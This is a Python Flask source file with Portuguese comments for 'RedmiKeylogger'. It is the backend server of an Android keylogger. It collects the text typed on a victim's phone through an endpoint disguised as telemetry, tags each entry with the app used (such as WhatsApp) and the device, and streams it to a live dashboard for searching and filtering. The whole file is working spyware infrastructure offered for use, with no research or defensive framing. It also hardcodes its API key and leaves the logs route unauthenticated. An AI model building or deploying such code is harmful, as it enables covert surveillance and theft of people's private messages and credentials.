#!/usr/bin/env python3
"""
RedmiKeylogger — Backend Server
================================
Servidor Flask que recebe logs do app Android via HTTP POST
e exibe um dashboard em tempo real com Server-Sent Events (SSE).

Rotas:
  GET  /              → Dashboard HTML com tabela de logs em tempo real
  POST /v1/telemetry  → Endpoint que recebe eventos do app Android
  GET  /v1/stream     → SSE stream para atualização em tempo real
  GET  /v1/logs       → Retorna todos os logs em JSON (API auxiliar)
  DELETE /v1/logs     → Limpa todos os logs em memória

Uso:
  pip install flask
  python server.py
"""

import json
import queue
import threading
from datetime import datetime
from functools import wraps
from flask import Flask, Response, jsonify, render_template_string, request, stream_with_context

# ─────────────────────────────────────────────────────────────────────────────
# Configuração
# ─────────────────────────────────────────────────────────────────────────────

API_KEY = "minha-chave-secreta-123"   # ← mesma key configurada no app Android
HOST    = "0.0.0.0"                   # escuta em todas as interfaces de rede
PORT    = 5000
MAX_LOGS = 500                        # máximo de logs mantidos em memória

app = Flask(__name__)

# Armazenamento em memória (lista thread-safe protegida por Lock)
logs: list[dict] = []
logs_lock = threading.Lock()

# Fila de eventos SSE — cada cliente tem a sua própria
sse_clients: list[queue.Queue] = []
sse_clients_lock = threading.Lock()

# ─────────────────────────────────────────────────────────────────────────────
# Autenticação
# ─────────────────────────────────────────────────────────────────────────────

def require_api_key(f):
    """Decorator que valida o header Authorization: Bearer <API_KEY>."""
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return jsonify({"error": "Authorization header ausente ou inválido"}), 401
        token = auth_header.split("Bearer ", 1)[1].strip()
        if token != API_KEY:
            return jsonify({"error": "API Key inválida"}), 403
        return f(*args, **kwargs)
    return decorated

# ─────────────────────────────────────────────────────────────────────────────
# Helpers SSE
# ─────────────────────────────────────────────────────────────────────────────

def broadcast_event(log_entry: dict):
    """Envia um novo log para todos os clientes SSE conectados."""
    data = json.dumps(log_entry, ensure_ascii=False)
    with sse_clients_lock:
        dead_clients = []
        for q in sse_clients:
            try:
                q.put_nowait(data)
            except queue.Full:
                dead_clients.append(q)
        for q in dead_clients:
            sse_clients.remove(q)

# ─────────────────────────────────────────────────────────────────────────────
# Rotas da API
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/v1/telemetry", methods=["POST"])
@require_api_key
def telemetry():
    """Recebe um único evento de input (compatibilidade com versões antigas)."""
    if not request.is_json:
        return jsonify({"error": "Content-Type deve ser application/json"}), 400

    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Payload JSON inválido"}), 400

    required = {"timestamp", "app_package", "input"}
    missing = required - data.keys()
    if missing:
        return jsonify({"error": f"Campos ausentes: {missing}"}), 422

    entry = _make_entry(
        timestamp    = data.get("timestamp", ""),
        app_package  = data.get("app_package", "unknown"),
        input_text   = data.get("input", ""),
        device_model = data.get("device_model", "—"),
    )
    _store_and_broadcast(entry)
    return jsonify({"status": "ok", "id": entry["id"]}), 201


@app.route("/v1/telemetry/batch", methods=["POST"])
@require_api_key
def telemetry_batch():
    """
    Recebe um lote de eventos do LogManager (modo batch a cada 5 s).

    Payload esperado:
    {
      "device_model": "Xiaomi Redmi Note 12",
      "batch_size": 3,
      "events": [
        { "timestamp": "...", "app_package": "com.whatsapp", "input": "Olá" },
        ...
      ]
    }
    """
    if not request.is_json:
        return jsonify({"error": "Content-Type deve ser application/json"}), 400

    data = request.get_json(silent=True)
    if not data or "events" not in data:
        return jsonify({"error": "Campo 'events' ausente no payload"}), 422

    events      = data.get("events", [])
    device_model = data.get("device_model", "—")

    if not isinstance(events, list) or len(events) == 0:
        return jsonify({"status": "ok", "accepted": 0}), 200

    accepted = 0
    for ev in events:
        if not isinstance(ev, dict):
            continue
        if not {"timestamp", "app_package", "input"}.issubset(ev.keys()):
            continue  # ignora entradas malformadas dentro do batch

        entry = _make_entry(
            timestamp    = ev.get("timestamp", ""),
            app_package  = ev.get("app_package", "unknown"),
            input_text   = ev.get("input", ""),
            device_model = device_model,
        )
        _store_and_broadcast(entry)
        accepted += 1

    return jsonify({"status": "ok", "accepted": accepted}), 201


# ── Helpers internos ──────────────────────────────────────────────────────────

def _make_entry(timestamp: str, app_package: str, input_text: str, device_model: str) -> dict:
    """Cria um dict de log com ID auto-incrementado e hora de recebimento."""
    with logs_lock:
        entry_id = len(logs) + 1

    return {
        "id":           entry_id,
        "received_at":  datetime.now().strftime("%H:%M:%S"),
        "timestamp":    timestamp,
        "app_package":  app_package,
        "input":        input_text,
        "device_model": device_model,
    }


def _store_and_broadcast(entry: dict):
    """Armazena a entrada na lista em memória e notifica clientes SSE."""
    with logs_lock:
        logs.append(entry)
        if len(logs) > MAX_LOGS:
            logs.pop(0)
    broadcast_event(entry)


@app.route("/v1/logs", methods=["GET"])
def get_logs():
    """Retorna todos os logs armazenados em JSON."""
    with logs_lock:
        return jsonify(list(reversed(logs)))


@app.route("/v1/logs", methods=["DELETE"])
@require_api_key
def clear_logs():
    """Limpa todos os logs em memória."""
    with logs_lock:
        logs.clear()
    broadcast_event({"__clear__": True})
    return jsonify({"status": "logs limpos"}), 200


@app.route("/v1/stream")
def sse_stream():
    """
    Server-Sent Events — mantém conexão aberta e empurra
    novos logs ao dashboard em tempo real.
    """
    client_queue: queue.Queue = queue.Queue(maxsize=50)

    with sse_clients_lock:
        sse_clients.append(client_queue)

    def generate():
        # Envia os últimos 20 logs imediatamente ao conectar
        with logs_lock:
            recent = list(reversed(logs[-20:]))
        for entry in recent:
            yield f"data: {json.dumps(entry, ensure_ascii=False)}\n\n"

        try:
            while True:
                try:
                    data = client_queue.get(timeout=25)
                    yield f"data: {data}\n\n"
                except queue.Empty:
                    # Heartbeat para manter a conexão viva
                    yield ": heartbeat\n\n"
        except GeneratorExit:
            with sse_clients_lock:
                if client_queue in sse_clients:
                    sse_clients.remove(client_queue)

    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )

# ─────────────────────────────────────────────────────────────────────────────
# Dashboard HTML
# ─────────────────────────────────────────────────────────────────────────────

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>RedmiKeylogger — Dashboard</title>
  <style>
    /* ── Reset & Base ─────────────────────────────────────────────── */
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg:        #0d0d0d;
      --surface:   #161616;
      --surface2:  #1e1e1e;
      --border:    #2a2a2a;
      --accent:    #7c3aed;
      --accent2:   #a78bfa;
      --green:     #22c55e;
      --red:       #ef4444;
      --yellow:    #eab308;
      --text:      #e4e4e7;
      --muted:     #71717a;
      --mono:      'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
    }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      font-size: 14px;
      min-height: 100vh;
    }

    /* ── Header ──────────────────────────────────────────────────── */
    header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 28px;
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .logo {
      font-family: var(--mono);
      font-size: 18px;
      font-weight: 700;
      color: var(--accent2);
      letter-spacing: -0.5px;
    }
    .logo span { color: var(--muted); font-weight: 400; }
    .status-pill {
      display: flex;
      align-items: center;
      gap: 7px;
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 999px;
      padding: 5px 14px;
      font-size: 12px;
      font-family: var(--mono);
    }
    .dot {
      width: 8px; height: 8px;
      border-radius: 50%;
      background: var(--red);
      transition: background .3s;
    }
    .dot.connected { background: var(--green); animation: pulse 2s infinite; }
    @keyframes pulse {
      0%,100% { opacity: 1; }
      50%      { opacity: .4; }
    }

    /* ── Stats Bar ───────────────────────────────────────────────── */
    .stats-bar {
      display: flex;
      gap: 16px;
      padding: 14px 28px;
      background: var(--surface);
      border-bottom: 1px solid var(--border);
    }
    .stat-card {
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 10px 18px;
      min-width: 130px;
    }
    .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); }
    .stat-value { font-family: var(--mono); font-size: 22px; font-weight: 700; margin-top: 2px; }

    /* ── Controls ────────────────────────────────────────────────── */
    .controls {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 14px 28px;
      background: var(--bg);
      border-bottom: 1px solid var(--border);
      flex-wrap: wrap;
    }
    .search-wrap {
      position: relative;
      flex: 1;
      min-width: 220px;
    }
    .search-wrap svg {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--muted);
      pointer-events: none;
    }
    input[type="search"] {
      width: 100%;
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 8px;
      color: var(--text);
      font-size: 13px;
      font-family: var(--mono);
      padding: 9px 12px 9px 38px;
      outline: none;
      transition: border-color .2s;
    }
    input[type="search"]:focus { border-color: var(--accent); }

    select {
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 8px;
      color: var(--text);
      font-size: 13px;
      padding: 9px 12px;
      outline: none;
      cursor: pointer;
    }
    button {
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 8px;
      color: var(--text);
      font-size: 12px;
      padding: 9px 16px;
      cursor: pointer;
      transition: background .2s, border-color .2s;
      white-space: nowrap;
    }
    button:hover { background: var(--border); }
    button.danger { border-color: var(--red); color: var(--red); }
    button.danger:hover { background: #3f1212; }

    /* ── Tabela ──────────────────────────────────────────────────── */
    .table-wrap {
      overflow-x: auto;
      padding: 20px 28px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 13px;
    }
    thead th {
      text-align: left;
      padding: 10px 14px;
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: .1em;
      color: var(--muted);
      border-bottom: 1px solid var(--border);
      white-space: nowrap;
    }
    tbody tr {
      border-bottom: 1px solid var(--border);
      transition: background .15s;
    }
    tbody tr:hover { background: var(--surface2); }
    tbody tr.new-row {
      animation: fadeIn .5s ease;
    }
    @keyframes fadeIn {
      from { background: #2e1a5233; }
      to   { background: transparent; }
    }
    td {
      padding: 10px 14px;
      vertical-align: top;
      max-width: 380px;
    }
    td.mono { font-family: var(--mono); font-size: 12px; }
    .badge {
      display: inline-block;
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 4px;
      padding: 2px 7px;
      font-family: var(--mono);
      font-size: 11px;
      color: var(--accent2);
      white-space: nowrap;
    }
    .badge.window { color: var(--yellow); border-color: #3b2f0a; background: #1f1a08; }
    .input-text {
      word-break: break-all;
      line-height: 1.5;
    }
    .input-text.window-event { color: var(--muted); font-size: 12px; }
    .device { color: var(--muted); font-size: 11px; font-family: var(--mono); }
    .time-cell { color: var(--muted); font-family: var(--mono); font-size: 11px; white-space: nowrap; }
    #empty-state {
      text-align: center;
      padding: 60px;
      color: var(--muted);
      display: none;
    }
    #empty-state.visible { display: block; }
    #empty-state svg { margin-bottom: 12px; opacity: .3; }

    /* ── Footer ──────────────────────────────────────────────────── */
    footer {
      text-align: center;
      padding: 16px;
      color: var(--muted);
      font-size: 11px;
      border-top: 1px solid var(--border);
      font-family: var(--mono);
    }
  </style>
</head>
<body>

<!-- ══ Header ══════════════════════════════════════════════════════════════ -->
<header>
  <div class="logo">RedmiKeylogger <span>/ dashboard</span></div>
  <div class="status-pill">
    <div class="dot" id="dot"></div>
    <span id="conn-label">Conectando…</span>
  </div>
</header>

<!-- ══ Stats ═══════════════════════════════════════════════════════════════ -->
<div class="stats-bar">
  <div class="stat-card">
    <div class="stat-label">Total de Logs</div>
    <div class="stat-value" id="stat-total">0</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Filtrados</div>
    <div class="stat-value" id="stat-filtered">0</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Apps Únicos</div>
    <div class="stat-value" id="stat-apps">0</div>
  </div>
</div>

<!-- ══ Controles ════════════════════════════════════════════════════════════ -->
<div class="controls">
  <div class="search-wrap">
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
    </svg>
    <input type="search" id="search-input" placeholder="Buscar por texto, pacote, dispositivo…"/>
  </div>
  <select id="pkg-filter">
    <option value="">Todos os apps</option>
  </select>
  <button onclick="togglePause()" id="btn-pause">⏸ Pausar</button>
  <button class="danger" onclick="clearLogs()">🗑 Limpar</button>
</div>

<!-- ══ Tabela ════════════════════════════════════════════════════════════════ -->
<div class="table-wrap">
  <table id="log-table">
    <thead>
      <tr>
        <th>#</th>
        <th>Hora</th>
        <th>Aplicativo</th>
        <th>Input Capturado</th>
        <th>Dispositivo</th>
      </tr>
    </thead>
    <tbody id="log-body"></tbody>
  </table>
  <div id="empty-state" class="visible">
    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
      <path d="M3 12h18M3 6h18M3 18h18"/>
    </svg>
    <p>Aguardando eventos do app Android…</p>
  </div>
</div>

<footer>
  RedmiKeylogger Server — Flask + SSE &nbsp;|&nbsp; porta {{ port }}
</footer>

<script>
  // ── Estado ─────────────────────────────────────────────────────────────────
  let allLogs   = [];
  let paused    = false;
  let packages  = new Set();

  // ── Referências DOM ────────────────────────────────────────────────────────
  const tbody      = document.getElementById("log-body");
  const searchEl   = document.getElementById("search-input");
  const pkgFilter  = document.getElementById("pkg-filter");
  const statTotal  = document.getElementById("stat-total");
  const statFilt   = document.getElementById("stat-filtered");
  const statApps   = document.getElementById("stat-apps");
  const emptyState = document.getElementById("empty-state");
  const dot        = document.getElementById("dot");
  const connLabel  = document.getElementById("conn-label");
  const btnPause   = document.getElementById("btn-pause");

  // ── SSE ────────────────────────────────────────────────────────────────────
  function connectSSE() {
    const es = new EventSource("/v1/stream");

    es.onopen = () => {
      dot.classList.add("connected");
      connLabel.textContent = "Conectado";
    };

    es.onmessage = (e) => {
      const data = JSON.parse(e.data);

      // Comando de limpeza enviado pelo servidor
      if (data.__clear__) {
        allLogs = [];
        packages.clear();
        tbody.innerHTML = "";
        refreshUI([]);
        return;
      }

      // Evita duplicatas ao reconectar (o stream reenvia os últimos 20)
      if (allLogs.find(l => l.id === data.id)) return;

      allLogs.unshift(data);                // mais recente primeiro
      updatePackageFilter(data.app_package);

      if (!paused) {
        renderRow(data, true);
        applyFilter();
      }
    };

    es.onerror = () => {
      dot.classList.remove("connected");
      connLabel.textContent = "Reconectando…";
      es.close();
      setTimeout(connectSSE, 3000);
    };
  }

  // ── Render ─────────────────────────────────────────────────────────────────
  function renderRow(log, prepend = false) {
    const isWindow = log.input.startsWith("[WINDOW]");
    const tr = document.createElement("tr");
    if (prepend) tr.classList.add("new-row");

    tr.dataset.id   = log.id;
    tr.dataset.pkg  = log.app_package;
    tr.dataset.text = (log.input + log.app_package + log.device_model).toLowerCase();

    tr.innerHTML = `
      <td class="time-cell">${log.id}</td>
      <td class="time-cell">${log.received_at}</td>
      <td><span class="badge ${isWindow ? 'window' : ''}">${log.app_package}</span></td>
      <td>
        <div class="input-text ${isWindow ? 'window-event' : ''}">
          ${escapeHtml(log.input)}
        </div>
      </td>
      <td class="device">${escapeHtml(log.device_model)}</td>
    `;

    if (prepend && tbody.firstChild) {
      tbody.insertBefore(tr, tbody.firstChild);
    } else {
      tbody.appendChild(tr);
    }
  }

  function escapeHtml(str) {
    return str.replace(/&/g,"&amp;").replace(/</g,"&lt;")
              .replace(/>/g,"&gt;").replace(/"/g,"&quot;");
  }

  // ── Filtro ─────────────────────────────────────────────────────────────────
  function applyFilter() {
    const query  = searchEl.value.toLowerCase().trim();
    const pkg    = pkgFilter.value;
    const rows   = tbody.querySelectorAll("tr");
    let visible  = 0;

    rows.forEach(tr => {
      const matchText = !query || tr.dataset.text.includes(query);
      const matchPkg  = !pkg   || tr.dataset.pkg === pkg;
      const show      = matchText && matchPkg;
      tr.style.display = show ? "" : "none";
      if (show) visible++;
    });

    emptyState.classList.toggle("visible", rows.length === 0);
    refreshUI(visible);
  }

  function refreshUI(filtered) {
    statTotal.textContent    = allLogs.length;
    statFilt.textContent     = typeof filtered === "number" ? filtered : allLogs.length;
    statApps.textContent     = packages.size;
  }

  function updatePackageFilter(pkg) {
    if (packages.has(pkg)) return;
    packages.add(pkg);
    const opt = document.createElement("option");
    opt.value = pkg;
    opt.textContent = pkg;
    pkgFilter.appendChild(opt);
    statApps.textContent = packages.size;
  }

  // ── Controles ──────────────────────────────────────────────────────────────
  function togglePause() {
    paused = !paused;
    btnPause.textContent = paused ? "▶ Continuar" : "⏸ Pausar";
    if (!paused) {
      // Ao retomar, renderiza tudo que chegou enquanto estava pausado
      tbody.innerHTML = "";
      allLogs.forEach(log => renderRow(log, false));
      applyFilter();
    }
  }

  function clearLogs() {
    if (!confirm("Limpar todos os logs?")) return;
    fetch("/v1/logs", {
      method: "DELETE",
      headers: { "Authorization": "Bearer {{ api_key }}" }
    });
  }

  // ── Eventos de busca ───────────────────────────────────────────────────────
  searchEl.addEventListener("input", applyFilter);
  pkgFilter.addEventListener("change", applyFilter);

  // ── Init ───────────────────────────────────────────────────────────────────
  connectSSE();
</script>
</body>
</html>"""


@app.route("/")
def dashboard():
    return render_template_string(
        DASHBOARD_HTML,
        port=PORT,
        api_key=API_KEY,
    )


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("  RedmiKeylogger — Backend Server")
    print("=" * 60)
    print(f"  Dashboard : http://localhost:{PORT}/")
    print(f"  Endpoint  : http://<seu-ip>:{PORT}/v1/telemetry")
    print(f"  API Key   : {API_KEY}")
    print("=" * 60)
    print("  Configure o mesmo API_KEY no app Android.")
    print("  Ctrl+C para parar o servidor.\n")
    # threaded=True é essencial para SSE funcionar com múltiplos clientes
    app.run(host=HOST, port=PORT, threaded=True, debug=False)
